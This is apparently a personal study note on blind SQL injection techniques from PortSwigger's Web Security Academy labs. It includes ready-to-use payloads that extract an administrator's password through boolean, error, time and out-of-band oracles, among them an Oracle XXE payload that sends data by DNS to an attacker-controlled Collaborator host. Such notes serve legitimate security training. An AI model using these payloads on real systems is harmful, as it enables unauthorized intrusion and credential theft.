---
tags:
  - portswigger
  - sqli
  - blind-sqli
---
> Source : [PortSwigger Web Security Academy - Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)

# Blind SQL Injection Techniques

Occurs when an application is vulnerable to SQL injection, yet **query results are never reflected** in the HTTP response.

---

## 1. Boolean-Based (Conditional Responses)

Used when the application alters page behavior or UI elements (such as displaying or hiding *"Welcome back"*) depending on whether the injected query returns rows.

### Mechanics
1. **Verify Condition:**
   * True: `xyz' AND '1'='1` $\rightarrow$ *"Welcome back"* appears.
   * False: `xyz' AND '1'='2` $\rightarrow$ *"Welcome back"* disappears.
   *(Note: `'1'='1` balances the backend's closing single quote).*

2. **Character-by-Character Extraction (`SUBSTRING`):**
   ```sql
   xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a
   ```
   * Use Binary Search (`> 'm'`) or brute-force (`a-z`, `0-9`).
   * **Optimization:** Automate via Python script or Burp Intruder (Cluster Bomb / Sniper) + Grep Match.

---

## 2. Error-Based SQLi

### A. Conditional Errors (HTTP 500 Trigger)
Used when the rendered UI does not change at all, but the server returns **HTTP 500** whenever a database runtime error occurs.

* **Concept:** Combine `CASE WHEN` logic to force a divide-by-zero error (`1/0`) **only when the guessed condition evaluates to TRUE**.

* **Oracle Payload (using string concat `||`):**
  ```sql
  xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  ```
  * Wrong guess $\rightarrow$ `ELSE ''` $\rightarrow$ `TrackingId = 'xyz'` $\rightarrow$ **HTTP 200 OK**.
  * Correct guess $\rightarrow$ `TO_CHAR(1/0)` $\rightarrow$ Divide-by-zero crash $\rightarrow$ **HTTP 500**.

### B. Visible Error-Based (`CAST`)
Used when the application prints verbose database error messages directly in the response, turning blind SQLi into **single-request data extraction**.

* **Concept:** Force the database to cast a secret string value into an integer using `CAST(... AS int)`. The type conversion fails and leaks the raw value inside the error message.

* **Payload (PostgreSQL):**
  ```sql
  ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```
  * **Error Output:** `ERROR: invalid input syntax for type integer: "<password>"`
  * **Bypassing Character Limits:** Strip the original cookie value (start directly with `'`) and replace `WHERE username='administrator'` with `LIMIT 1` (or `LIMIT 1 OFFSET X` to iterate rows).

---

## 3. Time-Based Blind SQLi

Used when responses are identical and all errors are silently caught (no HTTP 500), but the database executes the query **synchronously**.

* **Truth Oracle:** Measure HTTP response duration (`r.elapsed.total_seconds()`).

* **PostgreSQL Payload:**
  ```sql
  xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
  ```

* **Engineering Notes (Python Automation):**
  * Avoid passing `cookies={}` in Python `requests` for raw SQLi payloads (it auto-wraps values in double quotes `"` if special characters appear); inject raw payloads directly via `headers={"Cookie": ...}`.
  * Time-based attacks suffer from thread-queue false positives under high concurrency—use **sequential execution + Binary Search** for speed and accuracy.
  * Reuse TCP/TLS connections with `s = requests.Session()` (unless the server enforces `Connection: close`).
  * Master template: `~/CSC/arsenal/sqli/time_pg.py`.

---

## 4. Out-of-Band (OAST)

Used when queries execute **asynchronously** (e.g., background worker/thread), meaning response timing, boolean states, and HTTP status codes do not reflect query execution.

* **Mechanics:** Force the database engine to perform an outbound **DNS lookup** (and optionally an HTTP request) to an attacker-controlled server (Burp Collaborator).
* **Data Exfiltration:** Embed query output (such as a password) as a DNS subdomain prefix:
  `<password>.<collaborator-domain>`
* **Oracle Example (XXE via SQLi):**
  ```sql
  x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--
  ```
  *(Note: Inside an HTTP `Cookie` header, `;` and `%` within XML must be URL-encoded as `%3b` and `%25` to prevent premature cookie truncation).*

---

## Related Notes
* [[00 - SQLi Overview & Mindset]]
* [[99 - SQLi Cheat Sheet]]
